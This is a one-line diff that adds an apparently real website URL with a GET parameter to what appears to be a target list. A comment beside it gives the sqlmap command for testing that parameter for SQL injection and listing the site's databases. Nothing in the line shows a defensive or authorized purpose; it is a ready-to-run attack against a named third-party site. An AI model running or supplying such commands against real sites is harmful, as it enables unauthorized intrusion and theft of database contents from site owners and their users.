@@ -1,0 +1,1 @@
+http://www.xmvb.org/art.php?id=8 (GET)  # sqlmap.py -u http://www.xmvb.org/art.php?id=8 --dbs
